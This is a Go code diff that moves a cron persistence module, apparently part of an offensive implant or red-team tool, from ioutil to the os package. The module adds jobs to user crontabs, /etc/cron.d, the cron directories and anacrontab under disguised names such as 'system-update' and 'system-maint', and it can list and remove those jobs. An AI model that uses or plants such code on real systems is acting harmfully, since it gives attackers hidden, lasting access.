@@ -7,7 +7,6 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -185,7 +184,7 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 
 		// Read existing crontab (if exists)
 		var existingContent []byte
-		if content, err := ioutil.ReadFile(cronPath); err == nil {
+		if content, err := os.ReadFile(cronPath); err == nil {
 			existingContent = content
 			// Check if already added
 			if strings.Contains(string(content), command) {
@@ -197,7 +196,7 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)
 
 		// Write back
-		if err := ioutil.WriteFile(cronPath, newContent, 0600); err == nil {
+		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
 			return fmt.Sprintf("[+] Added cron job to %s", cronPath)
 		}
 	}
@@ -222,7 +221,7 @@ func (c *CronPersistenceCommand) addViaCronD(username, interval, command string)
 		c.convertInterval(interval), username, command)
 
 	// Write file
-	if err := ioutil.WriteFile(filename, []byte(cronContent), 0644); err == nil {
+	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
 		return fmt.Sprintf("[+] Created cron job in %s", filename)
 	}
 
@@ -261,7 +260,7 @@ func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string)
 	scriptName := filepath.Join(targetDir, "system-update")
 	scriptContent := fmt.Sprintf("#!/bin/bash\n%s\n", command)
 
-	if err := ioutil.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
+	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
 		return fmt.Sprintf("[+] Created cron script in %s", scriptName)
 	}
 
@@ -278,7 +277,7 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 	}
 
 	// Read existing content
-	content, err := ioutil.ReadFile(anacronTab)
+	content, err := os.ReadFile(anacronTab)
 	if err != nil {
 		return ""
 	}
@@ -292,7 +291,7 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 	anacronEntry := fmt.Sprintf("\n1\t5\tsystem-maint\t%s\n", command)
 	newContent := append(content, []byte(anacronEntry)...)
 
-	if err := ioutil.WriteFile(anacronTab, newContent, 0644); err == nil {
+	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
 		return "[+] Added anacron job to /etc/anacrontab"
 	}
 
@@ -443,7 +442,7 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 
 // cleanCronFile removes our entries from a cron file
 func (c *CronPersistenceCommand) cleanCronFile(filepath string) error {
-	content, err := ioutil.ReadFile(filepath)
+	content, err := os.ReadFile(filepath)
 	if err != nil {
 		return err
 	}
@@ -465,12 +464,12 @@ func (c *CronPersistenceCommand) cleanCronFile(filepath string) error {
 		cleanedLines = append(cleanedLines, line)
 	}
 
-	return ioutil.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0600)
+	return os.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0600)
 }
 
 // cleanAnacron removes our anacron entries
 func (c *CronPersistenceCommand) cleanAnacron() error {
-	content, err := ioutil.ReadFile("/etc/anacrontab")
+	content, err := os.ReadFile("/etc/anacrontab")
 	if err != nil {
 		return err
 	}
@@ -484,7 +483,7 @@ func (c *CronPersistenceCommand) cleanAnacron() error {
 		}
 	}
 
-	return ioutil.WriteFile("/etc/anacrontab", []byte(strings.Join(cleanedLines, "\n")), 0644)
+	return os.WriteFile("/etc/anacrontab", []byte(strings.Join(cleanedLines, "\n")), 0644)
 }
 
 // listCronPersistence lists all found cron persistence
@@ -500,7 +499,7 @@ func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 		}
 
 		for _, path := range cronPaths {
-			if content, err := ioutil.ReadFile(path); err == nil {
+			if content, err := os.ReadFile(path); err == nil {
 				if strings.Contains(string(content), "Added by system at") {
 					results = append(results, fmt.Sprintf("[+] Found persistence in %s", path))
 				}
@@ -522,7 +521,7 @@ func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 	}
 
 	// Check anacrontab
-	if content, err := ioutil.ReadFile("/etc/anacrontab"); err == nil {
+	if content, err := os.ReadFile("/etc/anacrontab"); err == nil {
 		if strings.Contains(string(content), "system-maint") {
 			results = append(results, "[+] Found persistence in /etc/anacrontab")
 		}
